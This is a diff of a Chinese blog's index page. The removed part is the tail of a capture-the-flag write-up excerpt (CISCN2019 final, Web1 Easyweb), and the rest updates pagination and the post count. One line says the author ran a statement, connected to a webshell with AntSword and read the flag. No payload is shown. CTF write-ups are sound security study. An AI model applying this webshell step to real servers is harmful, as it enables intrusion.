-<img src="/images/CISCN2019-总决赛-Day2-Web1-Easyweb/image-20210423120923447.png" alt="image-20210423120923447" style="zoom:80%;" />
-
-<p>成功执行了语句，蚁剑连接，在根目录即可找到flag</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1376,7 +1314,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">88</span>
+          <span class="site-state-item-count">92</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
